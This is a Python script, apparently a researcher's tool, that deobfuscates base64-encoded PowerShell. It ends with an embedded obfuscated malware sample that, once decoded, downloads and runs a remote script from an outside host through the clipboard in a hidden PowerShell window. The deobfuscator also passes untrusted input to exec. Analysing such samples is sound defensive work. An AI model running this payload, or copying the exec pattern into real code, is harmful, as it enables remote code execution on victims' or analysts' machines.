#!/usr/bin/env python
import re, base64, ast, sys

__author__  = "Jeff White [karttoon] @noottrak"
__email__   = "karttoon@gmail.com"
__version__ = "1.0.1"
__date__    = "07SEP2017"

def charReplace(inputString):

    # OLD: ("{1}{0}{2}" -F"AMP","EX","LE")
    # NEW: "EXAMPLE"

    # Find group of obfuscated string
    obfGroup = re.search("(\"|\')(\{[0-9]{1,2}\})+(\"|\')[ -fF].+?\'.+?\'\)(?!(\"|\'|;))",inputString).group()

    #print obfGroup

    # Build index and string lists
    indexList = [int(x) for x in re.findall("\d+", obfGroup.split("-")[0])]

    # This is to address scenarios where the string built is more PS commands with quotes
    stringList = re.search("(\"|\').+","-".join(obfGroup.split("-")[1:])[:-1]).group()
    stringChr = stringList[0]
    stringList = stringList.replace(stringChr + "," + stringChr, "\x00")
    stringList = stringList[1:-1]
    stringList = stringList.replace("'", "\x01").replace('"', "\x02")
    stringList = stringList.replace("\x00", stringChr + "," + stringChr)
    stringList = ast.literal_eval("[" + stringChr + stringList + stringChr + "]")

    for index,entry in enumerate(stringList):
        stringList[index] = entry.replace("\x01", "'").replace("\x02", '"')

    # Build output string
    stringOutput = ""
    for value in indexList:
        stringOutput += stringList[value]

    stringOutput = '"' + stringOutput + '")'

    #print "[+] Replaced %s | %s" % (obfGroup, stringOutput)

    # Replace original input with obfuscated group replaced
    return inputString.replace(obfGroup, stringOutput)

def spaceReplace(inputString):

    # OLD: $var=    "EXAMPLE"
    # NEW: $var= "EXAMPLE"

    return inputString.replace("  ", " ")

def joinStrings(inputString):

    # OLD: $var=("EX"+"AMP"+"LE")
    # NEW: $var="EXAMPLE"

    obfGroup = re.search("\((([ \']+[^\']+\'[ \+]+?)+|([ \"]+[^\"]+\"[ \+]+?)+)(\'[^\']+\'|\"[^\"]+\")[ ]{0,}\)(?!(\"|\'|;))", inputString)

    originalString = obfGroup.group()
    exec "newString = %s" % originalString
    newString = '"' + "".join(newString) + '"'

    #print "[+] Replaced %s | %s" % (originalString, newString)

    return inputString.replace(originalString, newString)

def removeNull(inputString):

    # Windows/Unicode null bytes will interfere with regex

    return inputString.replace("\x00", "")

def removeEscape(inputString):

    # OLD: $var=\'EXAMPLE\'
    # NEW: $var='EXAMPLE'

    return inputString.replace("\\'", "'").replace('\\"', '"')

def removeTick(inputString):

    # OLD: $v`a`r=`"EXAMPLE"`
    # NEW: $var="EXAMPLE"

    return inputString.replace("`", "")

def removeCaret(inputString):

    # OLD: $v^a^r=^"EXAMPLE"^
    # NEW: $var="EXAMPLE"

    return inputString.replace("^", "")

def adjustCase(inputString):

    # OLD: $vAR="ExAmpLE"
    # NEW: $var="example"

    return inputString.lower()

def main():

    # B64 Decode string
    inputString = base64.b64decode(sys.argv[1])

    print """
###################
# Original String #
###################\n\n%s
""" % inputString

    # Remove null bytes
    inputString = removeNull(inputString)

    # Replace escaped quotes
    inputString = removeEscape(inputString)

    # Remove back tick obfuscation
    inputString = removeTick(inputString)

    # Remove caret obfuscation
    inputString = removeCaret(inputString)

    # Iterate over each group until all replaced
    while re.search("(\"|\')(\{[0-9]{1,2}\})+(\"|\')[ -fF]+(\'.+?\'\))",inputString):

        inputString = charReplace(inputString)

    # Remove additional spacing
    while re.search("[\x20]{2,}", inputString):

        inputString = spaceReplace(inputString)

    # Join strings v1
    while re.search("\((([ \']+[^\']+\'[ \+]+?)+|([ \"]+[^\"]+\"[ \+]+?)+)(\'[^\']+\'|\"[^\"]+\")[ ]{0,}\)", inputString):

        inputString = joinStrings(inputString)

    # Join strings v2

    # Normalize case
    inputString = adjustCase(inputString)

    #########################
    print """
###################
# New String #
###################\n\n%s
""" % inputString

if __name__ == '__main__':
    main()



a = """
cmd /c " echo\ & ( $verbosepreference.tostring()[1,3]+'x'-join'')( " $( set-item 'variable:ofs' '' ) " + [string]('105p101-120-32>40f110{101{119e45~111{98@106x101p99p116@32e78p101-116>46n87p101@98-99@108e105>101@110~116-41f46p68>111-119{110n76x111-97~100x83n116~114p105x110n71n40-39x104e116>116p112n58p47p47x117{112p100e97{116f101p46p103@111{111e103n108{101~117{112{103~114p97n100>101-116@97~115{107{46~99f111p109>58x56~48>47{100{47f102f46~112~115@49{39~41~59'-split 'f' -split'x'-split 'p'-split '{'-split 'e'-split '@' -split'-'-split'~' -split'>'-split 'n' |foreach{ ( [char] [int]$_) } ) +" $(set-item 'variable:ofs' ' ' ) " )|clip.exe&&cmd.exe/c powershell -windows hidden -st -c [void][reflection.assembly]::("{5}{2}{3}{1}{0}{4}"-f ("{0}{1}"-f 'lna','m' ),'a','thp',("{0}{1}"-f 'a','rti' ),'e',( "{1}{0}"-f'wi','load' ) )."invoke"( ( "{1}{2}{3}{0}"-f'rms','system.w','indo','ws.fo' )) ; ${executioncontext}."invokecommand"."invokescript"(([system.windows.forms.clipboard]::( "{0}{2}{1}"-f 'ge',("{1}{0}"-f'xt','te' ),'t' )."invoke"( ) ) ); [system.windows.forms.clipboard]::("{1}{0}"-f 'ear','cl' )."invoke"( )"
"""
